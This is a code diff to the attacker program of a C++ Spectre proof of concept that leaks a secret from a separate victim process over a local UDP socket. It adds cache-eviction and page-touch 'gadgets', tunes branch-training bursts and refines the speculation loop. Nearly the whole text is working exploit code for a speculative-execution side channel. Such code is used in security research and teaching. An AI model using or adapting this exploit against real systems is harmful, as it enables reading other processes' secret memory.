@@ -6,8 +6,8 @@
 * "Spectre Attacks: Exploiting Speculative Execution" paper found at
 * https://spectreattack.com/spectre.pdf
 *
-* Modifications have been made by Luke McHale to demonstrate Spectre
-* across seperate victim and attacker processes.
+* Significant modifications have been made by Luke McHale to demonstrate
+*  Spectre across seperate victim and attacker processes.
 *
 **********************************************************************/
 
@@ -57,6 +57,7 @@ uint64_t target_len;      // Number of bytes to attempt to read at offset
 
 // [Optional] Relevant virtual addresses for attacker's convenience:
 uint64_t target_array1_va;   // VM Address of victim's array (e.g. array1[])
+uint64_t target_array1_size_va; // VM Address of victim's branch condition
 uint64_t target_va;          // VM Address of target in victim
 
 std::string secret;   // Bucket for stolen secret/s...
@@ -72,11 +73,13 @@ const uint8_t* array2;
 /********************************************************************
 Analysis code
 ********************************************************************/
+constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
+
 /* Default to a cache hit threshold of 80 */
 uint64_t cache_hit_threshold = 100;
 constexpr size_t MIN_MEASUREMENTS = 64;
 
-#define ACCURATE_LATENCIES
+//#define ACCURATE_LATENCIES
 #ifdef ACCURATE_LATENCIES
 std::vector< std::array<uint16_t,256> > latency_ts;  // timeseries of access latencies
 #endif
@@ -84,7 +87,7 @@ std::vector< std::bitset<256> > hit_ts;  // timeseries of line hits
 
 /* Other global (optional) parameters */
 uint16_t udp_port = 7777;
-string ipv4_addr("127.0.0.1");
+std::string ipv4_addr("127.0.0.1");
 
 #ifdef NOCLFLUSH
 #define CACHE_FLUSH_ITERATIONS 2048
@@ -130,23 +133,23 @@ inline void flush_array2() {
 
 
 // TODO: Currently this is being done by the victim.  Need to rework...
-inline void flush_condition() {
-#ifndef NOCLFLUSH
-      _mm_clflush( &target_len );
-#else
-      /* Alternative to using clflush to flush the CPU cache */
-      /* Read addresses at 4096-byte intervals out of a large array.
-         Do this around 2000 times, or more depending on CPU cache size. */
-      for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {
-        junk2 = cache_flush_array[l];
-      }
-#endif
+inline void gadget_flush_condition() {
+  constexpr auto WAYS = 2048; // TODO: Make this more precise!
+  constexpr auto STRIDE = PAGE_SIZE;
+  uint8_t cache_flush_array[PAGE_SIZE * WAYS];
+
+  /* Alternative to using clflush to flush the CPU cache */
+  /* Read addresses at 4096-byte intervals out of a large array.
+     Do this around 2000 times, or more depending on CPU cache size. */
+  for(int l = WAYS * PAGE_SIZE - 1; l >= 0; l -= PAGE_SIZE) {
+    cache_flush_array[l] ^= target_x_offset;
+  }
 
       /* Delay (can also mfence) */
 #ifndef NOMFENCE
-      _mm_mfence();
+  _mm_mfence();
 #else
-      for (volatile int z = 0; z < 100; z++) {}
+  for (volatile int z = 0; z < 100; z++) {}
 #endif
 }
 
@@ -532,7 +535,7 @@ void send_worker(uint16_t port) {
 
 
 inline void burst_train(SocketUDP& s, size_t training_x = 0) {
-  constexpr size_t BURST_COUNT = 5;
+  constexpr size_t BURST_COUNT = 7;
 
   // Initialize target x to send to victim:
   msg m = {};
@@ -566,7 +569,7 @@ inline void speculate(SocketUDP& s, size_t malicious_x) {
 }
 
 
-inline void touch_page(SocketUDP& s, size_t x) {
+inline void gadget_touch_page(SocketUDP& s, size_t x) {
   // Send a single request with a malicious request:
   // Initialize target x to send to victim:
   msg m = {};
@@ -582,9 +585,24 @@ inline void touch_page(SocketUDP& s, size_t x) {
 }
 
 
+inline void gadget_evict_condition(SocketUDP& s) {
+  // Send a single request with a malicious request:
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.fn = FN_EVICT_CONDITION;
+
+  // Send a burst of 5 training (valid) requests:
+  auto bytes = s.send(&m, sizeof(m));
+  if ( unlikely(!(bytes > 0)) ) {
+    // buffer/send error?
+    std::cerr << "Failed to send FN_TOUCH_SECRET!" << std::endl;
+  }
+}
+
+
 void send_worker_v2(uint16_t port) {
   // Socket initialization:
-  uint8_t buf[2048];
+  uint8_t buf[2048];   // TODO: move this to SocketUDP?
   SocketUDP s;
   assert(s.setRemote(ipv4_addr, port) == 0);
   std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
@@ -620,7 +638,8 @@ void send_worker_v2(uint16_t port) {
       flush_array2();
 
       // Send request to victim:
-      burst_train(s, training_x); // Critical to allow speculation!
+      burst_train(s, training_x); // Critical to trick speculation down wrong path!
+      gadget_evict_condition(s);  // Critical to cause speculation while waiting for memory!
       speculate(s, malicious_x);
 
       // Wait some amount of time (or for server reply -- but may be too slow):
@@ -638,7 +657,7 @@ void send_worker_v2(uint16_t port) {
         // Wait for confirmation of malicious_x:
         auto bytes = s.recv(buf, sizeof(buf));  // TODO: Replace me with recvmmsg!
         if (bytes == sizeof(msg)) {
-          if (m.x == malicious_x) {
+          if (m.fn == FN_PROCESS && m.x == malicious_x) {
             // Emulates a server error response
             break;
           }
@@ -725,7 +744,7 @@ void send_worker_v2(uint16_t port) {
     // Special Case: handle a potential minor page fault:
     if (zero_value_prediciton) {
       // Force a TLB hit by triggering a touch page gadget:
-      touch_page(s, secret_idx);   // Critical to prevent zero-value prediction!
+      gadget_touch_page(s, secret_idx); // Critical to prevent zero-value prediction!
 
       // Expect confirmation of gadget from victim (optional):
       msg& m = reinterpret_cast<msg&>(buf);
